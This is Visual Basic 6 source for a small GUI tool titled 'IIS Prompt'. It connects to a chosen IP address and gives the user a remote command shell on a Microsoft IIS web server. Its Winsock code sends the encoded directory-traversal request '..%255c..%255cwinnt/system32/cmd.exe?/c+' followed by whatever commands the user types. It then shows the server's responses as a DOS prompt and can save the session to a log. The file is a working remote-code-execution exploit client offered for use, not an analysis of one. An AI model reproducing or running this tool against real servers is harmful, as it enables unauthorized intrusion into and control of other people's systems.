VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{3B7C8863-D78F-101B-B9B5-04021C009402}#1.2#0"; "RICHTX32.OCX"
Begin VB.Form frmMain 
   Caption         =   "IIS Prompt"
   ClientHeight    =   4785
   ClientLeft      =   375
   ClientTop       =   1125
   ClientWidth     =   11175
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4785
   ScaleWidth      =   11175
   StartUpPosition =   2  'CenterScreen
   Begin VB.TextBox Text1 
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "Lucida Console"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00C0C0C0&
      Height          =   4815
      Left            =   0
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   0
      Top             =   0
      Width           =   11175
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   3120
      Top             =   360
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      RemotePort      =   80
   End
   Begin RichTextLib.RichTextBox RichTextBox1 
      Height          =   735
      Left            =   2880
      TabIndex        =   1
      Top             =   3480
      Width           =   735
      _ExtentX        =   1296
      _ExtentY        =   1296
      _Version        =   393217
      TextRTF         =   $"Form1.frx":000C
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Lucida Console"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'********************************
'*** Written By Alan Perelman ***
'*** Email:                   ***
'***   alan@alanperelman.com  ***
'********************************
'*** No portion of this code  ***
'*** may be used without the  ***
'*** express written consent  ***
'*** of the author.           ***
'********************************

Dim ConnectFirst As Boolean
Dim CurDir As String
Dim CommandLenght As Integer
Dim txtBuffer As String
Dim txtOldBuffer As String


'********* All Code below is unorganized, but it's fairly clear as to what does what

Private Sub Form_Load()
Text1.Text = "VERSION: 0.7a                                          WRITTEN BY: Alan Perelman" & vbCrLf & "NOTE: The 'CD' and 'CHDIR' commands do not work at the moment. Some commands such as 'PING' will not display a result even though the command is executed, this is unavoidable due to the structure of the responses." & vbCrLf & vbCrLf
Winsock1.RemoteHost = frmLogin.txtIP.Text
Unload frmLogin
Winsock1.Connect
frmMain.Caption = "IIS-Dos Prompt - " & Winsock1.RemoteHost
ConnectFirst = True
CommandLenght = 0
End Sub

Private Sub Form_Resize()
frmMain.Width = 11265
Text1.Height = frmMain.Height - 370
End Sub

Private Sub Form_Unload(Cancel As Integer)
x = MsgBox("Do you wish to save your session in a log file?", vbYesNoCancel)
Select Case x
    Case 2: Cancel = 1
    Case 6: SaveToLog
End Select
End Sub

Function SaveToLog()
RichTextBox1.Text = Text1.Text
RichTextBox1.SaveFile Winsock1.RemoteHost & "-" & ColonToDot(Time) & ".rtf"
End Function

Private Sub Text1_Change()
Text1.SelStart = Len(Text1.Text) ' 2 line autoscroll code
Text1.SelLength = 1
End Sub

Private Sub Text1_KeyDown(KeyCode As Integer, Shift As Integer)
Select Case KeyCode
    Case 114
        If CommandLenght = 0 Then
            If Right$(Text1.Text, Len(txtOldBuffer)) <> txtOldBuffer Then
                Text1.Text = Text1.Text & txtOldBuffer
                txtBuffer = txtOldBuffer
                CommandLenght = Len(txtOldBuffer)
            End If
        End If
End Select
End Sub

Private Sub Text1_KeyPress(KeyAscii As Integer)
Select Case KeyAscii
    Case 13
        If Trim$(txtBuffer) <> "" Then
            txtOldBuffer = txtBuffer
            CommandLenght = 0
            Winsock1.Close
            Winsock1.Connect
        End If
    Case 8
        If CommandLenght <> 0 Then
        Text1.Text = Left$(Text1.Text, Len(Text1.Text) - 1)
        txtBuffer = Left$(txtBuffer, Len(txtBuffer) - 1)
        CommandLenght = CommandLenght - 1
        End If
    Case Else
        CommandLenght = CommandLenght + 1
        Text1.Text = Text1.Text & Chr(KeyAscii)
        txtBuffer = txtBuffer & Chr(KeyAscii)
End Select
End Sub

Private Sub Winsock1_Close()
Winsock1.Close
If ConnectFirst = False Then Text1.Text = Text1.Text & CurDir & ">"
End Sub

Private Sub Winsock1_Connect()
If ConnectFirst = True Then
    Winsock1.SendData "GET /scripts/..%255c..%255cwinnt/system32/cmd.exe?/" & vbCrLf
Else
    Winsock1.SendData "GET /scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+" & SpaceToPlus(txtBuffer) & vbCrLf
End If
End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
Dim Data As String
Winsock1.GetData Data
If Len(Data) = bytesTotal Then ParseData Data
'MsgBox Data
End Sub

Function ParseData(Data As String)
Select Case Left$(Data, 12)
    Case "HTTP/1.1 200"
        If ConnectFirst = True Then
            Data = Mid$(Data, InStr(1, Data, "stream") + 8)
        Else
            Data = vbCrLf & Mid$(Data, InStr(1, Data, "stream") + 8)
        End If
    Case "HTTP/1.1 502"
        Data = Mid$(Data, InStr(1, Data, "<pre>") + 5)
        Data = vbCrLf & Trim$(Mid$(Data, 1, Len(Data) - 6)) & vbCrLf
    Case Else
        Select Case ConnectFirst
            Case True
                If Right$(Left$(Data, 3), 2) = ":\" Then CurDir = Left$(Data, Len(Data) - 1)
                ConnectFirst = False
            Case Else
        End Select
End Select
Text1.Text = Text1.Text & Trim$(Data)
End Function
